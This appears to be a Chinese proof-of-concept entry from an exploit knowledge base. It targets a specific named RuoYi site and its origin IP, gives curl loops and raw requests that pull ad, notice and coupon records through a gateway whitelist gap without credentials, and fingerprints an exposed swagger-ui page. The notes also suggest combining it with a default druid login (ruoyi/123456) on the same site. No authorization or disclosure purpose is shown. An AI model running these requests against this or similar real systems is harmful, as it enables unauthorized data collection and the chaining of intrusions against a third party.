# RuoYi 站点网关鉴权白名单未覆盖业务 /api/*（liqinaicj.cn /mmjd）：未授权读广告位/公告等全量记录 + swagger-ui 静态页放行

- **code**: ruoyi-mmjd-gateway-whitelist-api-unauth-swagger-shell
- **kind**: poc
- **category**: info-leak
- **component**: RuoYi 若依 v3.8.3（Spring Boot + springfox 3.0.0 + /mmjd 上下文网关）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: task#616 / finding 1289 实测（python requests，verify=False，固定 Host: liqinaicj.cn，全程零 token/cookie）：① GET /mmjd/api/getAdsList → HTTP 200/1020B，body {"msg":"操作成功","code":200,"data":[{"title":...,"image":...,"createTime":"2022-10-08 23:45:58"}]}；② GET /mmjd/api/noticeList → 200/722B 带公告全量记录；③ /api/couponList、/api/newFoodList 同为 200 带 data；④ GET /mmjd/swagger-ui/index.html → 200/3129B，springfox 3.0.0 页面（含 swagger-ui-bundle.js），同路径 /v3/api-docs spec 为 401；⑤ 阴性对照 GET /mmjd/mall/food/list 同条件 200 但 body {"code":401,"msg":"请求访问：/mmjd/mall/food/list，认证失败，无法访问系统资源"}，证明 200 系白名单放行而非全站开放。故判定成立（仅信息泄露，业务接口仍需鉴权）。
- **path**: pocs/ruoyi-mmjd-gateway-whitelist-api-unauth-swagger-shell/mmjd_gateway_api_unauth_probe.sh
- **tags**: ruoyi,liqinaicj,mmjd,unauth,info-leak,swagger,springfox,api-whitelist,host-routing
- **created_at**: 2026-11-06T02:13:07.809Z
- **engine**: https://liqinaicj.cn/mmjd/（源站 43.143.40.171）

## 描述

目标为 RuoYi 若依站点，业务上下文 /mmjd 下的 /api/* 路由前缀整体落在网关鉴权白名单里：广告位、公告、优惠券、新品等只读接口零凭据返回全量记录，swagger-ui 静态页也被白名单放行（spec 仍 401），可据此测绘后端 API 面。仅信息面，不直接导致数据写入。前置只要目标可达且 Host 头/SNI 为绑定域名（源站按 Host 路由）。

## 用法

```
前置：无需 Cookie/Token；域名可能已不再指向源站，必须用 --resolve 固定 Host 与 SNI（只改 Host 头不改 SNI 会被默认站吞掉）；本机有 HTTP 代理时一律 --noproxy '*'；Windows schannel 默认 TLS1.3 会 curl(35)，显式 --tlsv1.2 --tlsmax 1.2。

1) 先打阴性对照，确认 401 语义（不能跳过，否则分不清"白名单"和"全站裸奔"）：
   curl.exe -sS -k --noproxy '*' --tlsv1.2 --tlsmax 1.2 \
     --resolve liqinaicj.cn:443:43.143.40.171 -H 'Accept: application/json' \
     "https://liqinaicj.cn/mmjd/mall/food/list"
   期望 body 含 "code":401 / "认证失败" 且 HTTP 200（若直接 401 状态码属正常拦截，同样算对照成立）。

2) 逐条打候选只读接口，命中即 200 + {"code":200,"msg":"操作成功","data":[...]}：
   for p in api/getAdsList api/noticeList api/couponList api/newFoodList; do
     curl.exe -sS -k --noproxy '*' --tlsv1.2 --tlsmax 1.2 \
       --resolve liqinaicj.cn:443:43.143.40.171 -H 'Accept: application/json' \
       -w "\n[%{http_code}] $p\n" "https://liqinaicj.cn/mmjd/$p"
   done

3) 拿 API 面：GET /mmjd/swagger-ui/index.html → 200 且含 springfox 3.0.0 / swagger-ui-bundle.js；spec（/v3/api-docs）若 401 就从页面和前端 bundle 里 grep 路径继续按第 2 步打。

判据（三条缺一不可）：① 对照路径确为 401/带"认证失败"；② 候选接口 200 且 data 非空、字段是真实业务数据（标题/图片 URL/createTime）；③ swagger 静态页 200 只算"面暴露"，不算数据泄露，需靠 ② 定性。
常见失败原因：Host/SNI 不匹配（回默认站或 404）；走了本地代理；未用 --resolve 而 DNS 已迁走；上下文前缀不是 /mmjd（同款但换部署）导致全 404；接口路径大小写错误。
注意：只用 GET 只读接口；不要顺手打 delete/update 类。本条与 kb#570（同站 /mmjd/druid 默认口令 ruoyi/123456）互补，可组合打。
```

## 正文

```
# liqinaicj.cn /mmjd —— 网关鉴权白名单未覆盖业务 /api/* 的未授权只读验证
# 结论: /api/* 前缀整体放行, /mall/* 等业务前缀仍 401; swagger-ui 静态页亦在放行名单内
# 无 Cookie / Token / 账号; 源站 43.143.40.171 按 Host 头路由, 故用 --resolve 绑定 Host 与 SNI
# 依赖: curl (Windows 下 curl.exe 自带), 无需 python

DOMAIN=liqinaicj.cn
SRC=43.143.40.171
BASE="https://$DOMAIN/mmjd"
C="curl.exe -sS -k --noproxy * --tlsv1.2 --tlsmax 1.2 --max-time 10 --resolve $DOMAIN:443:$SRC"

# ---- 0. 阴性对照: 非白名单业务路径, 期望 code:401 "认证失败" ----
$C -H 'Accept: application/json' -w '\n[%{http_code}]\n' "$BASE/mall/food/list"

# ---- 1. 未授权只读接口（每条都应 200 + code:200 + data 非空）----
for p in api/getAdsList api/noticeList api/couponList api/newFoodList; do
  echo "=== $p"
  $C -H 'Accept: application/json' -w '\n[%{http_code}]\n' "$BASE/$p"
  sleep 1
done

# ---- 2. API 面: swagger-ui 静态壳（200 = 放行, 可据 bundle 继续扩路径）----
$C -o /dev/null -w '%{http_code} %{size_download}\n' "$BASE/swagger-ui/index.html"

# ---- 3. 原始请求形态（可直接贴进 Burp / 手搓）----
# GET /mmjd/api/getAdsList HTTP/1.1
# Host: liqinaicj.cn
# User-Agent: Mozilla/5.0 Chrome/124.0
# Accept: application/json
# --> HTTP 200, 1020B
# {"msg":"操作成功","code":200,"data":[{"title":...,"image":...,"createTime":"2022-10-08 23:45:58"}]}
#
# GET /mmjd/api/noticeList HTTP/1.1
# Host: liqinaicj.cn
# Accept: application/json
# --> HTTP 200, 722B, data 为公告全量记录
#
# GET /mmjd/mall/food/list HTTP/1.1        (对照)
# --> HTTP 200
# {"msg":"请求访问：/mmjd/mall/food/list，认证失败，无法访问系统资源","code":401}
#
# GET /mmjd/swagger-ui/index.html HTTP/1.1
# --> HTTP 200, 3129B, springfox 3.0.0 页面（引用 swagger-ui-bundle.js）
# 同目录 /v3/api-docs 为 401 —— 只放静态资源, 不放 spec

# ---- 4. python 版本（原验证即 requests verify=False + 固定 Host）----
# import requests
# H = {"Host":"liqinaicj.cn","Accept":"application/json","User-Agent":"Mozilla/5.0 Chrome/124.0"}
# for p in ["/mmjd/mall/food/list","/mmjd/api/getAdsList","/mmjd/api/noticeList",
#           "/mmjd/api/couponList","/mmjd/api/newFoodList"]:
#     r = requests.get("https://43.143.40.171"+p, headers=H, verify=False, timeout=10)
#     print(r.status_code, len(r.content), r.text[:200])

```
